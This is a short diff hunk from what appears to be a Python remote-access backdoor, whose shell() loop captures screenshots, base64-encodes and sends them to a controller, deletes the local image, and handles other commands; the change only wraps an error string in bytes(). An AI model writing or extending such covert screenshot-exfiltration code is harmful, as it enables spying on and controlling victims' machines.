@@ -157,7 +157,7 @@ def shell():
 				reliable_send(base64.b64encode(sc.read()))
 				os.remove("monitor-1.png")
 			except:
-				reliable_send("[!] Failed To Take Screenshot")
+				reliable_send(bytes("[!] Failed To Take Screenshot"))
 
 		elif command[:5] == "check":
 			try:
